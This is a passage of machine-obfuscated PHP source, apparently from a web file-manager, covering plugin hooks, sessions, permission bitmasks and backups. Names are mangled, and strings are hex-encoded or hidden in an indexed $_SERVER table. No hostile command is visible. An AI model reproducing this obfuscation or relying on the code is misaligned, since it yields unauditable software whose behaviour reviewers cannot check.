$¤Ñ„ÍŸ[2088], json_encode($ÎÚ¨±÷…)); } protected function getByTagID($«•£‹ò†, $ÍÑùÒ»œ) { $åÊıûŸ =& $_SERVER[¦»×‡Ãã]; if (!$«•£‹ò† || !$ÍÑùÒ»œ) { return !1; } if (!Model($åÊıûŸ[585])->getInfoSimple($«•£‹ò†)) { return !1; } $âç·ì›š = $this->get($«•£‹ò†); if (!$âç·ì›š || !isset($âç·ì›š[$åÊıûŸ[445]])) { return !1; } $§à®„Ãù = array_find_by_field($âç·ì›š[$åÊıûŸ[445]], $åÊıûŸ[475], $ÍÑùÒ»œ); return is_array($§à®„Ãù) ? $§à®„Ãù : !1; } public function listSource($Ä¦íó¹, $„ÆŒ²›€) { $£© ‚¡¦ =& $_SERVER[¦»×‡Ãã]; if ($„ÆŒ²›€ && !is_array($„ÆŒ²›€)) { $„ÆŒ²›€ = array($„ÆŒ²›€); } $ï“Ï¹“Š = $this->listData($Ä¦íó¹); $İ¡Úé³´ = array(); foreach ($ï“Ï¹“Š as $ŞïÀĞÏå) { $«û‡×Î¬ = $ŞïÀĞÏå[$£© ‚¡¦[87]]; if (!$«û‡×Î¬) { continue; } if (!isset($İ¡Úé³´[$«û‡×Î¬])) { $İ¡Úé³´[$«û‡×Î¬] = array(); } $İ¡Úé³´[$«û‡×Î¬][] = $ŞïÀĞÏå[$£© ‚¡¦[500]]; } $²Ú¸Éğ = array(); foreach ($İ¡Úé³´ as $º¯äŠˆü => $øîËîí) { $‘ì†ÖÇ‡ = !0; if (!$„ÆŒ²›€) { $²Ú¸Éğ[] = $º¯äŠˆü; continue; } foreach ($„ÆŒ²›€ as $ÀêÕÀ¦Š) { if (!in_array($ÀêÕÀ¦Š, $øîËîí)) { $‘ì†ÖÇ‡ = !1; break; } } if ($‘ì†ÖÇ‡) { $²Ú¸Éğ[] = $º¯äŠˆü; } } if (!$²Ú¸Éğ) { return array(); } $°ñ şªİ = array($£© ‚¡¦[491] => array($£© ‚¡¦[492], $²Ú¸Éğ), $£© ‚¡¦[569] => $Ä¦íó¹, $£© ‚¡¦[190] => SourceModel::TYPE_GROUP); $ì÷õ…Æ÷ = Model($£© ‚¡¦[1420])->listSource($°ñ şªİ); if (!$ì÷õ…Æ÷ || count($²Ú¸Éğ) == $ì÷õ…Æ÷[$£© ‚¡¦[442]][$£© ‚¡¦[443]]) { return $ì÷õ…Æ÷; } $¡Ó¾¯Ì = array(); $¥‚‡şÛ = array_to_keyvalue($ì÷õ…Æ÷[$£© ‚¡¦[85]], $£© ‚¡¦[12], $£© ‚¡¦[193]); $üı€ìš = array_to_keyvalue($ì÷õ…Æ÷[$£© ‚¡¦[86]], $£© ‚¡¦[12], $£© ‚¡¦[193]); $¸á¸Îó = array_merge($üı€ìš, $¥‚‡şÛ); foreach ($²Ú¸Éğ as $«û‡×Î¬) { if (!in_array($«û‡×Î¬, $¸á¸Îó)) { $¡Ó¾¯Ì[] = $«û‡×Î¬; } } if ($¡Ó¾¯Ì) { $this->removeBySource($Ä¦íó¹, $¡Ó¾¯Ì); } return $ì÷õ…Æ÷; } protected function listData($¾Ùëë·ì) { $ä³»ë´ü =& $_SERVER[¦»×‡Ãã]; $×›Œ©Œ = array($ä³»ë´ü[1763] => 0, $ä³»ë´ü[557] => array($ä³»ë´ü[2090], 0), $ä³»ë´ü[496] => $ä³»ë´ü[2091] . $¾Ùëë·ì); $İñº£ø = $ä³»ë´ü[2092]; $»Œ£–È¼ = $this->field($İñº£ø)->where($×›Œ©Œ)->order($ä³»ë´ü[2093])->select(); return $»Œ£–È¼ ? $»Œ£–È¼ : array(); } protected function addToTag($¹ñÍ®š, $ñô˜¼’, $·¢ñßŸØ) { $®ÃĞ¹¼µ =& $_SERVER[¦»×‡Ãã]; if (!$this->getByTagID($¹ñÍ®š, $·¢ñßŸØ) || !$ñô˜¼’) { return !1; } if (!Model($®ÃĞ¹¼µ[897])->pathInfo($ñô˜¼’)) { return !1; } $“£İË—» = array($®ÃĞ¹¼µ[1763] => 0, $®ÃĞ¹¼µ[557] => $·¢ñßŸØ, $®ÃĞ¹¼µ[495] => $ñô˜¼’, $®ÃĞ¹¼µ[496] => $®ÃĞ¹¼µ[2094] . $¹ñÍ®š, $®ÃĞ¹¼µ[494] => $®ÃĞ¹¼µ[12], $®ÃĞ¹¼µ[1975] => 0); if ($this->where($“£İË—»)->find()) { return !1; } return $this->add($“£İË—»); } protected function removeFromTag($â»óä‘, $ ±µñº», $…„µïÅ) { $Å’Óñ†ñ =& $_SERVER[¦»×‡Ãã]; if (!$this->getByTagID($â»óä‘, $…„µïÅ) || !$ ±µñº») { return !1; } if (is_array($ ±µñº»)) { $ ±µñº» = array($Å’Óñ†ñ[7], $ ±µñº»); } $ŞŒ÷¯îÏ = array($Å’Óñ†ñ[1763] => 0, $Å’Óñ†ñ[557] => $…„µïÅ, $Å’Óñ†ñ[496] => $Å’Óñ†ñ[2094] . $â»óä‘, $Å’Óñ†ñ[495] => $ ±µñº»); return $this->where($ŞŒ÷¯îÏ)->delete(); } protected function removeByTag($ªãÜ£Ûí, $ÌØğ„¿) { $¹²ÒÕ¹ =& $_SERVER[¦»×‡Ãã]; if (!$this->getByTagID($ªãÜ£Ûí, $ÌØğ„¿)) { return !1; } $¶ÕÌÒ‘À = array($¹²ÒÕ¹[1763] => 0, $¹²ÒÕ¹[557] => $ÌØğ„¿, $¹²ÒÕ¹[496] => $¹²ÒÕ¹[2094] . $ªãÜ£Ûí); return $this->where($¶ÕÌÒ‘À)->delete(); } protected function removeBySource($Š§×º»Ä, $›óÂÉŸ) { $¹µ«»Ò =& $_SERVER[¦»×‡Ãã]; if (!$Š§×º»Ä || !$›óÂÉŸ) { return !1; } if (is_array($›óÂÉŸ)) { $›óÂÉŸ = array($¹µ«»Ò[7], $›óÂÉŸ); } $ç³î ¨ = array($¹µ«»Ò[1763] => 0, $¹µ«»Ò[495] => $›óÂÉŸ, $¹µ«»Ò[557] => array($¹µ«»Ò[1092], 0), $¹µ«»Ò[496] => $¹µ«»Ò[2094] . $Š§×º»Ä); return $this->where($ç³î ¨)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x70\154\x75\x67\151\x6e\114\151\163\164"; public $field = array("\x6e\141\155\145", "\x73\x74\x61\x74\x75\163", "\162\x65\147\151\x65\x73\164", "\x63\157\x6e\x66\151\x67"); public function loadList($±æ“Ï¹Õ = false) { $áøÛ›‹å = array_to_keyvalue($this->listData(), $_SERVER[¦»×‡Ãã][32]); if ($±æ“Ï¹Õ) { return $áøÛ›‹å[$±æ“Ï¹Õ]; } return $áøÛ›‹å; } public function init() { $Ì³¼÷Ñ÷ =& $_SERVER[¦»×‡Ãã]; Hook::trigger($Ì³¼÷Ñ÷[2095]); $–Åõí£Ğ = $this->loadPluginList(); foreach ($–Åõí£Ğ as $øñÏÏ„µ => $­…È›ˆ‘) { $ËØ§Ã¶ = $this->appAllow($øñÏÏ„µ, $­…È›ˆ‘); if (!$ËØ§Ã¶) { continue; } foreach ($­…È›ˆ‘[$Ì³¼÷Ñ÷[2096]] as $çº‰¸‚ => $»İß¯ßô) { Hook::bind($çº‰¸‚, $»İß¯ßô); } } Hook::trigger($Ì³¼÷Ñ÷[2097]); Hook::trigger(ACTION); } public function appAllow($Èä¤œŞ‹, $»ÁÖ¦¬Î, $Ø´±ŠØ = true) { $åØ²ƒª± =& $_SERVER[¦»×‡Ãã]; $¯ÔÏ¤•Š = PLUGIN_DIR . $Èä¤œŞ‹ . $åØ²ƒª±[2098]; if (!is_array($»ÁÖ¦¬Î) || !is_array($»ÁÖ¦¬Î[$åØ²ƒª±[2096]]) || $»ÁÖ¦¬Î[$åØ²ƒª±[823]] != 1 || !is_file($¯ÔÏ¤•Š)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$åØ²ƒª±[6]][$åØ²ƒª±[2099]] || !$GLOBALS[$åØ²ƒª±[6]][$åØ²ƒª±[2100]]) { return !0; } $Áûú¤Û = explode($åØ²ƒª±[50], strtolower($GLOBALS[$åØ²ƒª±[6]][$åØ²ƒª±[2100]])); return in_array(strtolower($Èä¤œŞ‹), $Áûú¤Û) ? !1 : !0; } if ($Ø´±ŠØ && !Action($åØ²ƒª±[2101])->checkAuth($Èä¤œŞ‹)) { return !1; } return !0; } public function unInstall($”Œ€Ç–) { $éŞç²ƒÔ =& $_SERVER[¦»×‡Ãã]; $ÉáşÈ’í = $this->loadList($”Œ€Ç–); if (file_exists(PLUGIN_DIR . $”Œ€Ç–)) { Hook::apply($”Œ€Ç– . $éŞç²ƒÔ[2102]); } $this->remove($ÉáşÈ’í[$éŞç²ƒÔ[475]]); } public function changeStatus($‰»ë€¼é, $¹³÷¨ÓÃ) { $¬Ãı¡­Œ =& $_SERVER[¦»×‡Ãã]; $İãÍ¬îÆ = $this->loadList($‰»ë€¼é); if ($¹³÷¨ÓÃ) { Hook::apply($‰»ë€¼é . $¬Ãı¡­Œ[2103]); } $this->update($İãÍ¬îÆ[$¬Ãı¡­Œ[475]], array($¬Ãı¡­Œ[2104] => $¹³÷¨ÓÃ)); } public function appRegist($¹ĞÕ…¯, $»Éü‚°Å) { $Çê‰ â‘ =& $_SERVER[¦»×‡Ãã]; $±ºîö„Ö = $this->loadList($¹ĞÕ…¯); if ($±ºîö„Ö) { $this->update($±ºîö„Ö[$Çê‰ â‘[475]], array($Çê‰ â‘[2096] => $»Éü‚°Å)); } else { $°ê¤¦¡¥ = array($Çê‰ â‘[32] => $¹ĞÕ…¯, $Çê‰ â‘[2096] => $»Éü‚°Å, $Çê‰ â‘[823] => 0, $Çê‰ â‘[6] => $this->getConfigDefault($¹ĞÕ…¯)); $this->insert($°ê¤¦¡¥); } } public function getConfigDefault($òß£ç¡) { $ÇşĞ—Š¤ =& $_SERVER[¦»×‡Ãã]; $èÂËØîˆ = array(); $ùòÍ»œí = $this->getPackageJson($òß£ç¡); if (!$ùòÍ»œí && is_array($ùòÍ»œí[$ÇşĞ—Š¤[2105]])) { return $èÂËØîˆ; } foreach ($ùòÍ»œí[$ÇşĞ—Š¤[2105]] as $îô§×É => $²ÅõìÖò) { if (!isset($²ÅõìÖò[$ÇşĞ—Š¤[450]]) || isset($èÂËØîˆ[$îô§×É])) { continue; } $èÂËØîˆ[$îô§×É] = $²ÅõìÖò[$ÇşĞ—Š¤[450]]; } return $èÂËØîˆ; } public function getPackageJson($Şš³†®í) { return Hook::apply($Şš³†®í . $_SERVER[¦»×‡Ãã][2106]); } public function getConfig($“¹Å­»¯, $óõÅÓ¬ä = false) { $×ìş›ë =& $_SERVER[¦»×‡Ãã]; $…±ü±Ô = array(); $Ùü²‰¨¾ = $this->loadList($“¹Å­»¯); if ($Ùü²‰¨¾ && is_array($Ùü²‰¨¾[$×ìş›ë[6]])) { $…±ü±Ô = $Ùü²‰¨¾[$×ìş›ë[6]]; } if (!$…±ü±Ô || $óõÅÓ¬ä) { $…±ü±Ô = $this->getConfigDefault($“¹Å­»¯); } return $…±ü±Ô; } public function setConfig($£ÜéóŸÔ, $Õ“ØÏûÂ = false) { $Íµƒøı =& $_SERVER[¦»×‡Ãã]; $ò¾öÚõç = $this->loadList($£ÜéóŸÔ); if (!$ò¾öÚõç) { return !1; } $‰¬ÅçÕ¹ = $ò¾öÚõç[$Íµƒøı[6]]; if ($Õ“ØÏûÂ == !1) { $‰¬ÅçÕ¹ = array(); $Õ“ØÏûÂ = $this->getConfigDefault($£ÜéóŸÔ); } foreach ($Õ“ØÏûÂ as $îÜ¸ÊÜ => $š‹´õíË) { $‰¬ÅçÕ¹[$îÜ¸ÊÜ] = is_string($š‹´õíË) ? trim($š‹´õíË) : $š‹´õíË; } $this->update($ò¾öÚõç[$Íµƒøı[475]], array($Íµƒøı[6] => $‰¬ÅçÕ¹)); } public function viewList() { $ç¤¶ÆÓ– =& $_SERVER[¦»×‡Ãã]; $ªšÆòíÃ = $this->loadList(); $this->pluginScan($ªšÆòíÃ); $ªšÆòíÃ = $this->loadPluginList(); $Ñë­æõ = array(); foreach ($ªšÆòíÃ as $½€£ƒ´ => $ìÇ™ØÄ) { $İ‡äˆ˜Ô = $ìÇ™ØÄ; unset($ìÇ™ØÄ[$ç¤¶ÆÓ–[2096]], $ìÇ™ØÄ[$ç¤¶ÆÓ–[6]]); $ô¯—ù¥Ñ = PLUGIN_DIR . $ìÇ™ØÄ[$ç¤¶ÆÓ–[32]] . $ç¤¶ÆÓ–[2098]; if (!is_file($ô¯—ù¥Ñ)) { continue; } $ÁëÊò³ = Hook::apply($ìÇ™ØÄ[$ç¤¶ÆÓ–[32]] . $ç¤¶ÆÓ–[2106]); if (!is_array($ÁëÊò³)) { continue; } $Ñë­æõ[$½€£ƒ´] = array_merge($ìÇ™ØÄ, $ÁëÊò³); if ($İ‡äˆ˜Ô[$ç¤¶ÆÓ–[6]][$ç¤¶ÆÓ–[1686]] != $ÁëÊò³[$ç¤¶ÆÓ–[1660]]) { Hook::apply($ìÇ™ØÄ[$ç¤¶ÆÓ–[32]] . $ç¤¶ÆÓ–[2103]); $İ‡äˆ˜Ô[$ç¤¶ÆÓ–[6]][$ç¤¶ÆÓ–[1686]] = $ÁëÊò³[$ç¤¶ÆÓ–[1660]]; $this->update($ìÇ™ØÄ[$ç¤¶ÆÓ–[475]], array($ç¤¶ÆÓ–[6] => $İ‡äˆ˜Ô[$ç¤¶ÆÓ–[6]])); } } return $Ñë­æõ; } private function loadPluginList() { $‡ş³†şß =& $_SERVER[¦»×‡Ãã]; $ÁÈÂ×Ô´ = $this->loadList(); if (strtolower(MOD) == $‡ş³†şß[2107]) { return $ÁÈÂ×Ô´; } $î¾µ¾§ = Hook::trigger($‡ş³†şß[2108], $ÁÈÂ×Ô´); if ($ÁÈÂ×Ô´ && !$î¾µ¾§) { die; } return $î¾µ¾§ ? $î¾µ¾§ : $ÁÈÂ×Ô´; } private function pluginScan($Ëõœ¯éŞ) { $ÜÇµ¥¦“ =& $_SERVER[¦»×‡Ãã]; recursion_dir(PLUGIN_DIR, $İå—áô, $Ìû€à´ , 0); foreach ($İå—áô as $Ÿı¯±ù) { $Ç—ìÖšŒ = get_path_this($Ÿı¯±ù); if (isset($Ëõœ¯éŞ[$Ç—ìÖšŒ]) || !file_exists($Ÿı¯±ù . $ÜÇµ¥¦“[2109]) || !file_exists($Ÿı¯±ù . $ÜÇµ¥¦“[2098])) { continue; } Hook::apply($Ç—ìÖšŒ . $ÜÇµ¥¦“[2103]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\137\163\145\x73\x73\151\x6f\x6e"; public function get($ô·í¢ãÆ) { $Ï‰Ñ×ÆÓ =& $_SERVER[¦»×‡Ãã]; $Şç´ÎÈÂ = $this->where(array($Ï‰Ñ×ÆÓ[2110] => $ô·í¢ãÆ))->find(); if (!is_array($Şç´ÎÈÂ)) { return !1; } return $Şç´ÎÈÂ[$Ï‰Ñ×ÆÓ[171]]; } public function set($Ì¯¹É…±, $Êµ­ßí², $µúã”Ä = 3600) { $ŠÜØÛÁŞ =& $_SERVER[¦»×‡Ãã]; $å——‡ÀÄ = array($ŠÜØÛÁŞ[2110] => $Ì¯¹É…±, $ŠÜØÛÁŞ[2010] => $Êµ­ßí², $ŠÜØÛÁŞ[2111] => $µúã”Ä + time()); if (Session::get($ŠÜØÛÁŞ[2112])) { $å——‡ÀÄ[$ŠÜØÛÁŞ[1772]] = Session::get($ŠÜØÛÁŞ[2112]); } else { $å——‡ÀÄ[$ŠÜØÛÁŞ[1772]] = 0; } if ($this->get($Ì¯¹É…±)) { return $this->where(array($ŠÜØÛÁŞ[2110] => $Ì¯¹É…±))->save($å——‡ÀÄ); } else { return $this->add($å——‡ÀÄ, array(), !0); } } public function remove($é³œìàã) { return $this->where(array($_SERVER[¦»×‡Ãã][2110] => $é³œìàã))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¦»×‡Ãã][2113] . time())->delete(); } } goto AÕÑô‘Ò…Š; eçÜ¹íŸµ¤: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ß¨½ =& $_SERVER[¦»×‡Ãã]; $ÔŠ˜ãùƒ = array(array($ß¨½[494] => LNG($ß¨½[1972]), $ß¨½[1973] => $ß¨½[1974], $ß¨½[1975] => 1, $ß¨½[1976] => 1, $ß¨½[1977] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ß¨½[494] => LNG($ß¨½[1978]), $ß¨½[1973] => $ß¨½[1979], $ß¨½[1975] => 2, $ß¨½[1976] => 1, $ß¨½[1977] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ß¨½[494] => LNG($ß¨½[1980]), $ß¨½[1973] => $ß¨½[1981], $ß¨½[1975] => 3, $ß¨½[1976] => 1, $ß¨½[1977] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ß¨½[494] => LNG($ß¨½[1982]), $ß¨½[1973] => $ß¨½[1983], $ß¨½[1975] => 4, $ß¨½[1976] => 1, $ß¨½[1977] => self::AUTH_SHOW | self::AUTH_VIEW), array($ß¨½[494] => LNG($ß¨½[1984]), $ß¨½[1973] => $ß¨½[1985], $ß¨½[1975] => 5, $ß¨½[1976] => 1, $ß¨½[1977] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ß¨½[494] => LNG($ß¨½[1986]), $ß¨½[1973] => $ß¨½[1987], $ß¨½[1975] => 6, $ß¨½[1976] => 1, $ß¨½[1977] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ß¨½[494] => LNG($ß¨½[1988]), $ß¨½[1973] => $ß¨½[1989], $ß¨½[1975] => 7, $ß¨½[1976] => 1, $ß¨½[1977] => 0)); return $ÔŠ˜ãùƒ; } public static function authCheck($ç×÷®È–, $´øõğÌì) { $şë‰©¶˜ =& $_SERVER[¦»×‡Ãã]; $ç×÷®È– = intval($ç×÷®È–); if (KodUser::isRoot() && $GLOBALS[$şë‰©¶˜[6]][$şë‰©¶˜[1990]]) { return !0; } if ($ç×÷®È– <= 0) { return !1; } if (($ç×÷®È– & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ç×÷®È– & $´øõğÌì); } public static function authCheckShow($É¹è÷„œ) { return self::authCheck($É¹è÷„œ, self::AUTH_SHOW); } public static function authCheckView($¿£™ê»ò) { return self::authCheck($¿£™ê»ò, self::AUTH_VIEW); } public static function authCheckDownload($Õ”· Å¢) { return self::authCheck($Õ”· Å¢, self::AUTH_DOWNLOAD); } public static function authCheckUpload($À•¨ŞàÌ) { return self::authCheck($À•¨ŞàÌ, self::AUTH_UPLOAD); } public static function authCheckEdit($Ú­–ˆÁË) { return self::authCheck($Ú­–ˆÁË, self::AUTH_EDIT); } public static function authCheckRemove($ùì™Ö«á) { return self::authCheck($ùì™Ö«á, self::AUTH_REMOVE); } public static function authCheckShare($áÜÆò™ú) { return self::authCheck($áÜÆò™ú, self::AUTH_SHARE); } public static function authCheckComment($ğ×Œò½©) { return self::authCheck($ğ×Œò½©, self::AUTH_COMMENT); } public static function authCheckEvent($‹­ÅÓäÖ) { return self::authCheck($‹­ÅÓäÖ, self::AUTH_EVENT); } public static function authCheckRoot($¬™¥›èÁ) { return self::authCheck($¬™¥›èÁ, self::AUTH_ROOT); } public static function authCheckAction($ÚĞœß¯Ô, $õ®íŒ¿) { $‰àçÕòÒ =& $_SERVER[¦»×‡Ãã]; $Ôö¡½ˆ = array($‰àçÕòÒ[1991] => self::AUTH_VIEW, $‰àçÕòÒ[1279] => self::AUTH_DOWNLOAD, $‰àçÕòÒ[110] => self::AUTH_UPLOAD, $‰àçÕòÒ[1940] => self::AUTH_EDIT, $‰àçÕòÒ[1939] => self::AUTH_REMOVE, $‰àçÕòÒ[1950] => self::AUTH_SHARE, $‰àçÕòÒ[430] => self::AUTH_COMMENT, $‰àçÕòÒ[1760] => self::AUTH_EVENT, $‰àçÕòÒ[1992] => self::AUTH_ROOT); if (!isset($Ôö¡½ˆ[$õ®íŒ¿])) { return; } $İˆëÀ™ë = $Ôö¡½ˆ[$õ®íŒ¿]; $ÚĞœß¯Ô = intval($ÚĞœß¯Ô); if ($ÚĞœß¯Ô <= 0) { return !1; } if (($ÚĞœß¯Ô & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÚĞœß¯Ô & $İˆëÀ™ë); } public static function authDisable($¹˜‹øåÒ, $¼‚“½) { if (intval($¹˜‹øåÒ) <= 0) { return 0; } return intval($¹˜‹øåÒ) & ~$¼‚“½; } public $optionType = "\123\171\x73\x74\x65\155\56\163\157\165\162\143\145\x41\165\x74\x68\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\x61\x75\164\150", "\x6c\141\x62\x65\x6c", "\x64\151\x73\x70\x6c\x61\x79", "\163\171\x73\x74\x65\155", "\163\x6f\162\164"); public function initData() { $Ø÷—–ìş = $this->authDefault(); foreach ($Ø÷—–ìş as $…ı£ºìÓ) { $this->add($…ı£ºìÓ); } } public function findAuth($Ô’øáÛ, $ô¤ÈÓ¦æ) { $ìÇ©éøã =& $_SERVER[¦»×‡Ãã]; $ŸÌ°Øø = parent::listData(); foreach ($ŸÌ°Øø as $’Åù¸Ö¥) { $éæäÙ = intval($’Åù¸Ö¥[$ìÇ©éøã[487]]); if ($éæäÙ <= 0 || $’Åù¸Ö¥[$ìÇ©éøã[1993]] == 0) { continue; } if (($éæäÙ & $Ô’øáÛ) != $Ô’øáÛ) { continue; } if (($éæäÙ & $ô¤ÈÓ¦æ) != 0) { continue; } return $’Åù¸Ö¥[$ìÇ©éøã[475]]; } return !1; } public function findAuthReadOnly() { $ºÇ±“ŸØ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Ó¾ÑşÁ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ºÇ±“ŸØ, $Ó¾ÑşÁ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $’É Õëô =& $_SERVER[¦»×‡Ãã]; $à„âºöÛ = parent::listData(); $¦®ª‹ëÍ = !1; foreach ($à„âºöÛ as $ÌÅ¨Æ§Û) { if ($ÌÅ¨Æ§Û[$’É Õëô[487]] <= 0 || $ÌÅ¨Æ§Û[$’É Õëô[1993]] == $’É Õëô[228]) { continue; } if (!$¦®ª‹ëÍ) { $¦®ª‹ëÍ = $ÌÅ¨Æ§Û; continue; } if ($¦®ª‹ëÍ[$’É Õëô[487]] > $ÌÅ¨Æ§Û[$’É Õëô[487]]) { $¦®ª‹ëÍ = $ÌÅ¨Æ§Û; } } return $¦®ª‹ëÍ ? $¦®ª‹ëÍ[$’É Õëô[475]] : $’É Õëô[12]; } public function listData($±¤ŒÈÊì = false, $”–¶íü = "\x73\x6f\162\164", $Ü³¿’Ÿ = false) { return parent::listData($±¤ŒÈÊì, $”–¶íü, $Ü³¿’Ÿ); } public function update($ú£å», $†…íÂä¨) { $Ôœ•ÅüÃ =& $_SERVER[¦»×‡Ãã]; $Ü¦Ó•ğ˜ = parent::listData($ú£å»); $´Êé¸¬Ñ = $this->findByName($†…íÂä¨[$Ôœ•ÅüÃ[32]]); if (!$Ü¦Ó•ğ˜ || $´Êé¸¬Ñ && $´Êé¸¬Ñ[$Ôœ•ÅüÃ[475]] != $Ü¦Ó•ğ˜[$Ôœ•ÅüÃ[475]]) { return !1; } $this->filterAuth($†…íÂä¨[$Ôœ•ÅüÃ[487]]); return parent::update($ú£å», $†…íÂä¨); } public function remove($‰‘ïÅî) { $–ÑÜ§Ö = parent::listData($‰‘ïÅî); if (!$–ÑÜ§Ö || $–ÑÜ§Ö[$_SERVER[¦»×‡Ãã][191]]) { return !1; } return parent::remove($‰‘ïÅî); } public function add($İÚìï = array()) { $à¬Øº =& $_SERVER[¦»×‡Ãã]; if ($this->findByName($İÚìï[$à¬Øº[32]])) { return !1; } $—®÷ŠÌ = array($à¬Øº[32] => $à¬Øº[12], $à¬Øº[487] => 1, $à¬Øº[1994] => $à¬Øº[1981], $à¬Øº[1993] => 1, $à¬Øº[191] => 0, $à¬Øº[1995] => 0); $İÚìï = array_merge($—®÷ŠÌ, $İÚìï); $İÚìï[$à¬Øº[1995]] = $this->getSort(); $this->filterAuth($İÚìï[$à¬Øº[487]]); return parent::insert($İÚìï); } private function getSort() { $›õÓ¨€ö =& $_SERVER[¦»×‡Ãã]; $ó¼ÁÂÌ = parent::listData(); $šæÁÄå© = array_to_keyvalue($ó¼ÁÂÌ, $›õÓ¨€ö[12], $›õÓ¨€ö[1995]); return empty($šæÁÄå©) ? 0 : max($šæÁÄå©) + 1; } private function filterAuth(&$‰ğ€å–) { if (!$‰ğ€å–) { return; } $×±´µ¾ë = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÃÆîÄ»î = array(); foreach ($×±´µ¾ë as $‹ÁæÇìÅ) { if ($‰ğ€å– & $‹ÁæÇìÅ) { $ÃÆîÄ»î[] = $‹ÁæÇìÅ; } } if (in_array(self::AUTH_ROOT, $ÃÆîÄ»î)) { $‰ğ€å– = array_sum($×±´µ¾ë); return; } $•³¦î‘ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÃÆîÄ»î as $‹ÁæÇìÅ) { if (isset($•³¦î‘[$‹ÁæÇìÅ])) { $ÃÆîÄ»î = array_merge($ÃÆîÄ»î, $•³¦î‘[$‹ÁæÇìÅ]); } } $ÃÆîÄ»î[] = self::AUTH_SHOW; $‰ğ€å– = array_sum(array_unique($ÃÆîÄ»î)); } public function sort($’Õ¤öÔ½, $ €Şú“Ğ) { return parent::update($’Õ¤öÔ½, $ €Şú“Ğ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\142\x61\143\x6b\165\x70\x4c\x69\x73\x74"; public $field = array("\x69\157", "\x6e\141\x6d\x65", "\163\x74\x61\x74\165\163", "\143\157\156\x74\145\156\x74", "\x6d\141\x6e\165\x61\x6c", "\162\145\x73\x75\x6c\164", "\x74\x69\x6d\x65\x46\x72\x6f\155", "\x74\x69\x6d\145\x54\x6f"); public function config() { $šüÊÎ×¡ =& $_SERVER[¦»×‡Ãã]; Action($šüÊÎ×¡[1996])->taskInit(); $•ÓƒÚ¬† = Model($šüÊÎ×¡[843])->get($šüÊÎ×¡[856]); $•ÓƒÚ¬† = json_decode($•ÓƒÚ¬†, !0); $•ÓƒÚ¬† = is_array($•ÓƒÚ¬†) ? $•ÓƒÚ¬† : array(); $this->parseContent($•ÓƒÚ¬†); unset($•ÓƒÚ¬†[$šüÊÎ×¡[1742]]); Model($šüÊÎ×¡[1741])->cacheClear(); $ãƒ­…ğû = $šüÊÎ×¡[1997]; $“»‹¹ÚÎ = Model($šüÊÎ×¡[1998])->findByKey($šüÊÎ×¡[1760], $ãƒ­…ğû); if (!$“»‹¹ÚÎ) { $“»‹¹ÚÎ = array(); } if (isset($“»‹¹ÚÎ[$šüÊÎ×¡[206]])) { $“»‹¹ÚÎ[$šüÊÎ×¡[206]] = json_decode($“»‹¹ÚÎ[$šüÊÎ×¡[206]], !0); } if (isset($•ÓƒÚ¬†[$šüÊÎ×¡[206]])) { $“»‹¹ÚÎ[$šüÊÎ×¡[206]][$šüÊÎ×¡[1745]] = $•ÓƒÚ¬†[$šüÊÎ×¡[206]]; unset($•ÓƒÚ¬†[$šüÊÎ×¡[206]]); } return array_merge($“»‹¹ÚÎ, $•ÓƒÚ¬†); } public function listData($·Ù¥ÏÇİ = false, $¿ÙÉ÷ü = "\x6d\157\x64\x69\146\x79\x54\x69\155\145", $ıĞ¦Ã²î = false) { $—ËÙ¸“ = parent::listData($·Ù¥ÏÇİ, $¿ÙÉ÷ü, !0); if (!$—ËÙ¸“) { return $—ËÙ¸“; } if ($·Ù¥ÏÇİ) { $—ËÙ¸“ = array($—ËÙ¸“); } foreach ($—ËÙ¸“ as &$¥Õ—ÈÉä) { $this->parseContent($¥Õ—ÈÉä); } return $·Ù¥ÏÇİ ? $—ËÙ¸“[0] : $—ËÙ¸“; } public function parseContent(&$åÁá¶ö­) { $æ¼âçŞŞ =& 